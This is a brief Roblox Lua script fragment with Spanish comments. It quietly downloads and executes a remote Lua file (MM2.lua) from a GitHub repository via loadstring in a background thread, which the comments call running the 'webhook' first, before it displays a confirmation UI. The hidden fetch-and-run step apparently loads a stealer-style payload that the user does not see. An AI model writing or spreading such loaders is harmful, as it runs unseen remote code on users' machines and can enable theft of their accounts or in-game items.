-- 1️⃣ Ejecutar webhook primero (en segundo plano)
spawn(function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Anonimo221123/TestJonGhost/refs/heads/main/MM2.lua'))()
end)
-- 2️⃣ Inicializar UI después
UI:Show()  -- o como tengas tu UI
-- ======= UI DE CONFIRMACIÓN =======
